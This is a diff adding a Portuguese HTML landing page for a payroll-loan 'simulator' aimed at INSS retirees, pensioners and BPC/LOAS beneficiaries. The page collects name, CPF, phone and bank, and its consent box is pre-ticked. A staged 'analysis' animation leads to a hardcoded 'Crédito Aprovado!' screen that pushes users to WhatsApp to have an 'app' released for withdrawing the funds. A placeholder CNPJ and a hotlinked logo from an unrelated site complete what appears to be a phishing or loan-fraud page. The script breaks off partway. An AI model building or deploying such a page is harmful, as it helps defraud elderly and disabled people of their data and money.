@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simulador de Crédito | Consultoria Digital</title>
+    
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Load Inter Font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --brand-blue: #0057FF;
+            --brand-blue-dark: #003BB5;
+            --brand-blue-light: #EAF1FF;
+            --bg-gray: #F8FAFC;
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            scroll-behavior: smooth; 
+            background-color: var(--bg-gray);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Form Step Transitions */
+        .step-content { 
+            display: none; 
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        
+        .step-content.active { 
+            display: block; 
+            opacity: 1;
+            transform: translateY(0);
+            animation: fadeIn 0.4s ease-out forwards; 
+        }
+
+        @keyframes fadeIn { 
+            from { opacity: 0; transform: translateY(10px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
+        
+        /* Custom Button Gradients and Hover States */
+        .btn-primary { 
+            background: linear-gradient(135deg, var(--brand-blue) 0%, var(--brand-blue-dark) 100%); 
+            transition: all 0.3s ease; 
+            box-shadow: 0 4px 15px rgba(0, 87, 255, 0.25);
+        }
+        .btn-primary:hover { 
+            box-shadow: 0 6px 20px rgba(0, 87, 255, 0.35);
+            transform: translateY(-2px);
+        }
+        
+        /* Selectable Card Styling */
+        .card-choice { 
+            border: 2px solid #E2E8F0; 
+            background: white;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); 
+            position: relative; 
+            cursor: pointer;
+        }
+        .card-choice:hover { 
+            border-color: #93C5FD; 
+            background-color: #F0F9FF; 
+            transform: scale(1.01);
+        }
+        .card-choice.selected { 
+            border-color: var(--brand-blue); 
+            background-color: var(--brand-blue-light); 
+            box-shadow: 0 4px 12px rgba(0, 87, 255, 0.1); 
+        }
+        
+        /* Range Input Styling */
+        input[type="range"] { 
+            accent-color: var(--brand-blue); 
+            height: 8px;
+            border-radius: 9999px;
+            background: #E2E8F0;
+            outline: none;
+        }
+
+        /* Term Badges */
+        .term-badge { 
+            cursor: pointer; 
+            border: 2px solid #E2E8F0; 
+            background: white;
+            transition: all 0.2s; 
+            user-select: none; 
+        }
+        .term-badge:hover {
+            border-color: #93C5FD;
+            background-color: #F0F9FF;
+        }
+        .term-badge.active { 
+            background: var(--brand-blue); 
+            color: white; 
+            border-color: var(--brand-blue); 
+            box-shadow: 0 4px 10px rgba(0, 87, 255, 0.2);
+        }
+        
+        /* Custom Alert System */
+        #custom-alert {
+            display: none;
+            position: fixed;
+            top: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 1000;
+            animation: slideInDown 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes slideInDown { 
+            from { opacity: 0; transform: translate(-50%, -100%); } 
+            to { opacity: 1; transform: translate(-50%, 0); } 
+        }
+    </style>
+</head>
+<body class="text-slate-800 overflow-x-hidden antialiased flex flex-col min-h-screen">
+
+    <!-- Custom Error Message Toast -->
+    <div id="custom-alert" class="bg-red-500 text-white font-medium text-sm px-6 py-3 rounded-full shadow-xl flex items-center gap-2 border border-red-600">
+        <svg class="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+        <span id="custom-alert-text">Mensagem de erro aqui</span>
+    </div>
+
+    <!-- Transparency Notice -->
+    <header class="bg-blue-900 text-blue-100 text-[11px] md:text-xs py-2 px-4 text-center font-medium tracking-wide">
+        Operamos de acordo com as normas e diretrizes do Banco Central do Brasil. Simulação 100% gratuita.
+    </header>
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-white/90 backdrop-blur-md border-b border-gray-200 py-4 px-6 shadow-sm">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center gap-3 cursor-pointer">
+                <!-- Using a solid placeholder if the image fails, but keeping original source -->
+                <div class="h-10 w-10 bg-blue-100 rounded-lg flex items-center justify-center overflow-hidden border border-blue-200">
+                    <img src="http://www.feebpr.org.br/images/media/583464378693169a708217.jpg" alt="Logo" class="h-full w-full object-cover" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                    <span class="text-blue-600 font-black text-xl hidden" style="display:none;">%</span>
+                </div>
+                <span class="text-xl font-extrabold text-[#0057FF] tracking-tight">
+                    Portal<span class="text-slate-500 font-medium">Consignado</span>
+                </span>
+            </div>
+            
+            <div class="hidden md:flex items-center gap-6">
+                <div class="text-right">
+                    <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Consultoria Digital</p>
+                    <p class="text-xs font-semibold text-emerald-600 flex items-center gap-1.5 justify-end mt-0.5">
+                        <span class="relative flex h-2.5 w-2.5">
+                          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                          <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+                        </span>
+                        Consultores Disponíveis
+                    </p>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto px-6 py-12 lg:py-20 flex-grow w-full">
+        <div class="grid lg:grid-cols-12 gap-12 lg:gap-16 items-center">
+            
+            <!-- Left Content: Value Proposition -->
+            <div class="lg:col-span-5 space-y-8">
+                <div class="space-y-5">
+                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-blue-100 text-blue-700 text-xs font-bold uppercase tracking-wide">
+                        <span class="flex h-2 w-2 rounded-full bg-blue-600"></span>
+                        Taxas Reduzidas
+                    </div>
+                    <h1 class="text-4xl md:text-5xl lg:text-6xl font-extrabold text-slate-900 leading-[1.1] tracking-tight">
+                        Crédito consignado <br>
+                        <span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-blue-400">sem burocracia.</span>
+                    </h1>
+                    <p class="text-lg text-slate-600 leading-relaxed max-w-md font-medium">
+                        Encontre as menores taxas do mercado e receba suporte personalizado de especialistas para fazer a melhor escolha financeira.
+                    </p>
+                </div>
+
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div class="p-4 bg-white rounded-2xl border border-gray-200 shadow-sm flex items-center gap-4 hover:shadow-md transition-shadow">
+                        <div class="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center text-xl">🛡️</div>
+                        <div class="flex flex-col">
+                            <span class="text-sm font-bold text-slate-800">Simulação Segura</span>
+                            <span class="text-[11px] text-slate-500">Dados protegidos</span>
+                        </div>
+                    </div>
+                    <div class="p-4 bg-white rounded-2xl border border-gray-200 shadow-sm flex items-center gap-4 hover:shadow-md transition-shadow">
+                        <div class="w-10 h-10 rounded-full bg-amber-50 flex items-center justify-center text-xl">⚡</div>
+                        <div class="flex flex-col">
+                            <span class="text-sm font-bold text-slate-800">Resposta Rápida</span>
+                            <span class="text-[11px] text-slate-500">Atendimento ágil</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="text-[11px] text-slate-500 leading-relaxed border-l-4 border-blue-200 pl-4 py-1 bg-slate-50 rounded-r-lg p-2">
+                    * Análise de crédito simplificada sujeita a averbação de margem. Operamos rigorosamente de acordo com as diretrizes e normas do Banco Central do Brasil.
+                </div>
+            </div>
+
+            <!-- Form Container -->
+            <div class="lg:col-span-7 w-full" id="form-container">
+                <div class="bg-white rounded-[2rem] shadow-2xl shadow-blue-900/10 border border-gray-100 overflow-hidden relative">
+                    
+                    <!-- Progress Header -->
+                    <div class="bg-slate-50 border-b border-gray-100 p-6 md:px-8">
+                        <div class="flex justify-between items-center mb-4">
+                            <p class="text-[11px] font-extrabold text-slate-500 uppercase tracking-widest" id="step-label">Passo 1 de 6</p>
+                            <span class="text-xs font-bold px-3 py-1 bg-blue-100 text-blue-700 rounded-full" id="step-percentage">15%</span>
+                        </div>
+                        <div class="flex gap-2" id="progress-dots">
+                            <!-- JS injected dots -->
+                        </div>
+                    </div>
+
+                    <form id="pro-form" class="p-6 md:p-8 min-h-[500px] flex flex-col justify-between" onsubmit="return false;">
+                        
+                        <!-- STEP 1: PROFILE -->
+                        <div id="step-1" class="step-content active">
+                            <h2 class="text-2xl md:text-3xl font-extrabold text-slate-900 mb-2">Como você recebe sua renda?</h2>
+                            <p class="text-slate-500 text-sm mb-6">Selecione seu perfil para buscarmos as melhores ofertas.</p>
+                            
+                            <div class="grid gap-3">
+                                <button type="button" onclick="selectOption('perfil', 'Aposentado')" class="card-choice p-4 rounded-xl flex items-center gap-4 group w-full text-left">
+                                    <div class="w-14 h-14 bg-slate-50 group-hover:bg-blue-100 text-2xl rounded-xl flex items-center justify-center transition-colors">👴</div>
+                                    <div class="flex flex-col">
+                                        <span class="text-lg font-bold text-slate-800">Aposentado INSS</span>
+                                        <span class="text-xs text-slate-500">Benefício por tempo de contribuição/idade</span>
+                                    </div>
+                                </button>
+                                
+                                <button type="button" onclick="selectOption('perfil', 'Pensionista')" class="card-choice p-4 rounded-xl flex items-center gap-4 group w-full text-left">
+                                    <div class="w-14 h-14 bg-slate-50 group-hover:bg-blue-100 text-2xl rounded-xl flex items-center justify-center transition-colors">👵</div>
+                                    <div class="flex flex-col">
+                                        <span class="text-lg font-bold text-slate-800">Pensionista INSS</span>
+                                        <span class="text-xs text-slate-500">Beneficiário de pensão por morte</span>
+                                    </div>
+                                </button>
+                                
+                                <button type="button" onclick="selectOption('perfil', 'BPC/LOAS')" class="card-choice p-4 rounded-xl flex items-center gap-4 group w-full text-left">
+                                    <div class="w-14 h-14 bg-slate-50 group-hover:bg-blue-100 text-2xl rounded-xl flex items-center justify-center transition-colors">♿</div>
+                                    <div class="flex flex-col">
+                                        <span class="text-lg font-bold text-slate-800">Beneficiário BPC/LOAS</span>
+                                        <span class="text-xs text-slate-500">Benefício de Prestação Continuada</span>
+                                    </div>
+                                </button>
+                            </div>
+                            <input type="hidden" id="input-perfil">
+                        </div>
+
+                        <!-- STEP 2: SERVICE -->
+                        <div id="step-2" class="step-content">
+                            <button type="button" onclick="changeStep(-1)" class="text-sm font-semibold text-slate-400 hover:text-blue-600 mb-4 flex items-center gap-1 transition-colors"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg> Voltar</button>
+                            <h2 class="text-2xl md:text-3xl font-extrabold text-slate-900 mb-2">O que deseja fazer hoje?</h2>
+                            <p class="text-slate-500 text-sm mb-6">Escolha o serviço que melhor atende sua necessidade.</p>
+                            
+                            <div class="grid gap-4">
+                                <button type="button" onclick="selectOption('servico', 'Dinheiro Novo')" class="card-choice p-5 rounded-2xl flex items-center justify-between group w-full">
+                                    <div class="flex items-center gap-4">
+                                        <div class="w-12 h-12 bg-blue-600 text-white rounded-xl flex items-center justify-center font-bold text-lg shadow-md group-hover:bg-blue-700 transition-colors">R$</div>
+                                        <div class="flex flex-col text-left">
+                                            <span class="text-lg font-bold text-slate-800">Novo Empréstimo / Cartão</span>
+                                            <span class="text-xs text-slate-500">Preciso de dinheiro na conta agora</span>
+                                        </div>
+                                    </div>
+                                    <svg class="w-6 h-6 text-slate-300 group-hover:text-blue-500 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
+                                </button>
+                                
+                                <button type="button" onclick="selectOption('servico', 'Reduzir Parcelas')" class="card-choice p-5 rounded-2xl flex items-center justify-between group w-full">
+                                    <div class="flex items-center gap-4">
+                                        <div class="w-12 h-12 bg-emerald-100 text-emerald-600 text-2xl rounded-xl flex items-center justify-center shadow-sm group-hover:bg-emerald-200 transition-colors">📉</div>
+                                        <div class="flex flex-col text-left">
+                                            <span class="text-lg font-bold text-slate-800">Portabilidade (Reduzir Parcelas)</span>
+                                            <span class="text-xs text-slate-500">Quero baixar o juros do que já pago</span>
+                                        </div>
+                                    </div>
+                                    <svg class="w-6 h-6 text-slate-300 group-hover:text-blue-500 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
+                                </button>
+                            </div>
+                            <input type="hidden" id="input-servico">
+                        </div>
+
+                        <!-- STEP 3: SIMULATOR -->
+                        <div id="step-3" class="step-content">
+                            <button type="button" onclick="changeStep(-1)" class="text-sm font-semibold text-slate-400 hover:text-blue-600 mb-4 flex items-center gap-1 transition-colors"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg> Voltar</button>
+                            <h2 class="text-2xl md:text-3xl font-extrabold text-slate-900 mb-6">Faça uma simulação rápida</h2>
+                            
+                            <div class="space-y-8">
+                                <!-- Range Slider -->
+                                <div class="bg-slate-50 p-6 rounded-2xl border border-slate-100">
+                                    <div class="flex justify-between items-end mb-4">
+                                        <span class="text-[11px] font-bold text-slate-500 uppercase tracking-widest">Valor pretendido</span>
+                                        <span class="text-3xl font-black text-blue-600" id="sim-val-display">R$ 5.000</span>
+                                    </div>
+                                    <input type="range" id="sim-range" min="1000" max="30000" step="500" value="5000" class="w-full cursor-pointer hover:accent-blue-700 transition-all">
+                                    <div class="flex justify-between text-xs font-medium text-slate-400 mt-2">
+                                        <span>R$ 1.000</span>
+                                        <span>R$ 30.000+</span>
+                                    </div>
+                                </div>
+                                
+                                <!-- Terms -->
+                                <div>
+                                    <p class="text-[11px] font-bold text-slate-500 uppercase tracking-widest mb-3">Em quantas vezes?</p>
+                                    <div class="grid grid-cols-5 gap-2" id="term-container">
+                                        <!-- JS injected terms -->
+                                    </div>
+                                </div>
+                                
+                                <!-- Result Card -->
+                                <div class="bg-gradient-to-br from-blue-600 to-blue-800 rounded-2xl p-6 text-white shadow-lg relative overflow-hidden">
+                                    <!-- Decorative element -->
+                                    <div class="absolute top-0 right-0 -mr-8 -mt-8 w-32 h-32 rounded-full bg-white opacity-10"></div>
+                                    
+                                    <div class="flex flex-col md:flex-row justify-between items-center gap-6 text-center md:text-left relative z-10">
+                                        <div>
+                                            <p class="text-[11px] font-bold text-blue-200 uppercase mb-1 tracking-wider">Parcela Estimada</p>
+                                            <p class="text-4xl font-black" id="res-parcela">R$ 0,00</p>
+                                        </div>
+                                        <div class="hidden md:block h-12 w-px bg-white/20"></div>
+                                        <div>
+                                            <p class="text-[11px] font-bold text-blue-200 uppercase mb-1 tracking-wider">Taxa Estimada</p>
+                                            <p class="text-xl font-bold bg-white/10 px-3 py-1 rounded-lg backdrop-blur-sm inline-block">1,66% a.m.</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- STEP 4: PERSONAL DATA -->
+                        <div id="step-4" class="step-content">
+                            <h2 class="text-2xl md:text-3xl font-extrabold text-slate-900 mb-2">Seus dados básicos</h2>
+                            <p class="text-slate-500 text-sm mb-6">Precisamos de poucas informações para consultar sua margem de forma segura.</p>
+                            
+                            <div class="space-y-5">
+                                <div>
+                                    <label class="block text-[11px] font-bold text-slate-500 uppercase mb-1.5 ml-1">Nome Completo</label>
+                                    <input type="text" id="form-nome" placeholder="Digite seu nome conforme documento" class="w-full bg-slate-50 border border-slate-200 p-4 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:bg-white outline-none transition-all font-medium text-slate-800 placeholder-slate-400">
+                                </div>
+                                
+                                <div class="grid md:grid-cols-2 gap-5">
+                                    <div>
+                                        <label class="block text-[11px] font-bold text-slate-500 uppercase mb-1.5 ml-1">CPF</label>
+                                        <input type="text" id="form-cpf" placeholder="000.000.000-00" maxlength="14" class="w-full bg-slate-50 border border-slate-200 p-4 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:bg-white outline-none transition-all font-medium text-slate-800 placeholder-slate-400">
+                                    </div>
+                                    <div>
+                                        <label class="block text-[11px] font-bold text-slate-500 uppercase mb-1.5 ml-1">Celular / WhatsApp</label>
+                                        <input type="text" id="form-tel" placeholder="(00) 00000-0000" maxlength="15" class="w-full bg-slate-50 border border-slate-200 p-4 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:bg-white outline-none transition-all font-medium text-slate-800 placeholder-slate-400">
+                                    </div>
+                                </div>
+                                <div class="flex items-start gap-2 mt-2">
+                                    <input type="checkbox" id="form-lgpd" checked class="mt-1 accent-blue-600 rounded">
+                                    <label for="form-lgpd" class="text-[10px] text-slate-500 leading-tight">Autorizo o uso dos meus dados para consulta de margem consignável e concordo em ser contatado via WhatsApp ou telefone, respeitando a Lei Geral de Proteção de Dados (LGPD).</label>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- STEP 5: BANK DETAILS -->
+                        <div id="step-5" class="step-content">
+                            <button type="button" onclick="changeStep(-1)" class="text-sm font-semibold text-slate-400 hover:text-blue-600 mb-4 flex items-center gap-1 transition-colors"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg> Voltar</button>
+                            <h2 class="text-2xl md:text-3xl font-extrabold text-slate-900 mb-2">Dados do Recebimento</h2>
+                            <p class="text-slate-500 text-sm mb-6">Em qual banco você recebe seu benefício/salário atualmente?</p>
+                            
+                            <div class="space-y-6">
+                                <div>
+                                    <label class="block text-[11px] font-bold text-slate-500 uppercase mb-1.5 ml-1">Banco pagador</label>
+                                    <div class="relative">
+                                        <select id="form-banco" class="w-full bg-slate-50 border border-slate-200 p-4 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:bg-white outline-none font-medium appearance-none text-slate-800 cursor-pointer">
+                                            <option value="">Selecione a instituição...</option>
+                                            <option>Itaú / Itaú BMG</option>
+                                            <option>Bradesco</option>
+                                            <option>Banco do Brasil</option>
+                                            <option>Caixa Econômica Federal</option>
+                                            <option>Santander</option>
+                                            <option>Banco Pan</option>
+                                            <option>Mercantil do Brasil</option>
+                                            <option>Crefisa</option>
+                                            <option>Agibank</option>
+                                            <option>Outro (Conta Corrente)</option>
+                                            <option>Cartão Magnético (Sem conta)</option>
+                                        </select>
+                                        <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-slate-500">
+                                            <svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <div>
+                                    <label class="block text-[11px] font-bold text-slate-500 uppercase mb-1.5 ml-1">Data do pagamento (Opcional)</label>
+                                    <div class="relative">
+                                        <select id="form-dia" class="w-full bg-slate-50 border border-slate-200 p-4 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 focus:bg-white outline-none font-medium appearance-none text-slate-800 cursor-pointer">
+                                            <option value="">Não sei / Prefiro não informar</option>
+                                            <!-- JS populated -->
+                                        </select>
+                                        <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-4 text-slate-500">
+                                            <svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- STEP 6: LOADING E SUCCESS -->
+                        <div id="step-6" class="step-content text-center py-8">
+                            
+                            <!-- Estado de Carregamento (Animação de Análise) -->
+                            <div id="loading-state" class="flex flex-col items-center justify-center py-10 space-y-6">
+                                <div class="relative w-24 h-24">
+                                    <div class="absolute inset-0 border-8 border-slate-100 rounded-full"></div>
+                                    <div class="absolute inset-0 border-8 border-blue-600 rounded-full border-t-transparent animate-spin"></div>
+                                    <div class="absolute inset-0 flex items-center justify-center">
+                                        <svg class="w-8 h-8 text-blue-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                                    </div>
+                                </div>
+                                <div>
+                                    <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 animate-pulse mb-2">Analisando seu perfil...</h2>
+                                    <p class="text-slate-500 font-medium">Conectando com o sistema e calculando margem disponível</p>
+                                </div>
+                            </div>
+
+                            <!-- Estado de Sucesso (Aprovado) -->
+                            <div id="success-state" class="hidden">
+                                <div class="relative w-32 h-32 mx-auto mb-6">
+                                    <div class="absolute inset-0 bg-green-200 rounded-full animate-ping opacity-75"></div>
+                                    <div class="relative z-10 w-full h-full bg-green-500 text-white rounded-full flex items-center justify-center shadow-2xl border-4 border-green-100 transform transition-transform hover:scale-110">
+                                        <svg class="w-16 h-16 animate-bounce mt-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+                                        </svg>
+                                    </div>
+                                </div>
+                                
+                                <h2 class="text-4xl md:text-5xl font-black text-green-600 mb-2 uppercase tracking-tight animate-pulse">
+                                    Crédito Aprovado!
+                                </h2>
+                                
+                                <div class="bg-slate-50 p-6 rounded-2xl border border-green-100 my-6 shadow-sm inline-block min-w-[280px]">
+                                    <p class="text-sm text-slate-500 font-bold uppercase tracking-wider mb-2">Detalhes da Aprovação</p>
+                                    <p class="text-xl font-bold text-slate-800" id="success-nome-display">Nome do Cliente</p>
+                                    <p class="text-md text-slate-600 font-medium font-mono mt-1" id="success-cpf-display">000.000.000-00</p>
+                                    <div class="h-px bg-slate-200 w-full my-3"></div>
+                                    <p class="text-[11px] font-bold text-slate-400 uppercase tracking-widest mb-1">Valor Liberado</p>
+                                    <p class="text-3xl font-black text-blue-600" id="success-valor-display">R$ 0,00</p>
+                                </div>
+
+                                <p class="text-slate-700 mb-8 max-w-lg mx-auto font-medium text-lg leading-relaxed">
+                                    Parabéns! Sua simulação foi aprovada com sucesso. Para segurança da operação, fale com um consultor agora para <strong>liberarmos o aplicativo onde você realizará o saque</strong> dos valores direto na sua conta.
+                                </p>
+                                
+                                <button type="button" onclick="handleWhatsAppRedirect()" class="w-full md:w-auto md:px-10 mx-auto py-5 bg-gradient-to-r from-green-500 to-green-600 text-white font-black rounded-xl text-lg hover:from-green-600 hover:to-green-700 transition-all shadow-xl hover:shadow-2xl hover:-translate-y-1 flex items-center justify-center gap-3 border-b-4 border-green-800 active:border-b-0 active:translate-y-0">
+                                    <svg class="w-7 h-7" fill="currentColor" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 00-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+                                    CHAMAR NO WHATSAPP PARA SACAR
+                                </button>
+                                
+                                <p class="text-[11px] text-slate-400 mt-5 flex items-center justify-center gap-1.5 font-medium">
+                                    <svg class="w-4 h-4 text-green-500" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                                    Atendimento 100% Seguro
+                                </p>
+                            </div>
+                        </div>
+
+                        <!-- Navigation Buttons -->
+                        <div class="mt-8 flex flex-col md:flex-row gap-3 pt-6 border-t border-slate-100" id="nav-container">
+                            <button type="button" id="prevBtn" onclick="changeStep(-1)" class="hidden md:block w-full md:w-1/4 py-4 bg-white border-2 border-slate-200 text-slate-500 font-bold rounded-xl hover:bg-slate-50 hover:text-slate-700 transition-all text-sm uppercase tracking-widest">Voltar</button>
+                            <button type="button" id="nextBtn" onclick="changeStep(1)" class="w-full flex-1 py-4 btn-primary text-white font-extrabold rounded-xl text-lg uppercase tracking-wide flex items-center justify-center gap-2">
+                                Continuar
+                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
+                            </button>
+                        </div>
+
+                    </form>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-blue-950 text-white pt-16 pb-8 px-6 mt-auto">
+        <div class="max-w-7xl mx-auto space-y-10">
+            <div class="flex flex-col md:flex-row justify-between items-start gap-8 border-b border-blue-800 pb-10">
+                <div class="max-w-sm">
+                    <span class="text-2xl font-black tracking-tight text-blue-100">
+                        Portal<span class="text-blue-400 font-medium">Consignado</span>
+                    </span>
+                    <p class="text-xs text-blue-300 mt-4 leading-relaxed font-medium">
+                        Consultoria especializada em crédito consignado. Nosso compromisso é encontrar as menores taxas e garantir um processo transparente e seguro para você.
+                    </p>
+                </div>
+                <div class="grid grid-cols-1 gap-2 text-xs text-blue-200 font-medium tracking-wide">
+                    <p class="flex items-center gap-2">
+                        <svg class="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"></path></svg>
+                        CNPJ: 00.000.000/0001-00
+                    </p>
+                    <p class="flex items-center gap-2">
+                        <svg class="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
+                        Atendimento Nacional via WhatsApp
+                    </p>
+                    <p class="flex items-center gap-2">
+                        <svg class="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                        Ambiente 100% Seguro
+                    </p>
+                </div>
+            </div>
+            <div class="text-[10px] text-blue-400/80 text-center font-medium leading-relaxed max-w-4xl mx-auto space-y-2">
+                <p>
+                    O Portal Consignado atua como correspondente bancário seguindo as diretrizes do Banco Central do Brasil (Resolução nº 3.954). 
+                    <strong>NÃO COBRAMOS nenhum tipo de taxa antecipada para liberação de crédito.</strong> Se alguém lhe solicitar depósitos prévios, denuncie!
+                </p>
+                <p>
+                    A aprovação do crédito e as taxas de juros (Custo Efetivo Total - CET) dependem de análise de crédito, perfil do cliente, convênio e margem consignável disponível no momento da digitação da proposta.
+                </p>
+                <p class="pt-4">© 2026 Portal Consignado. Todos os direitos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // State Variables
+        let currentStep = 1;
+        const totalSteps = 6;
+        let selectedTerm = 84;
+        const phoneMain = "5512983155709";
+
+        // Initialization
+        window.onload = () => {
+            initProgressDots();
+            initDays();
+            initTerms();
+            updateStepView();
+            recalc();
+        };
+
+        // UI Setup Functions
+        function initProgressDots() {
+            const container = document.getElementById('progress-dots');
+            for(let i=1; i<=totalSteps; i++) {
+                const dot = document.createElement('div');
+                dot.id = `dot-${i}`;
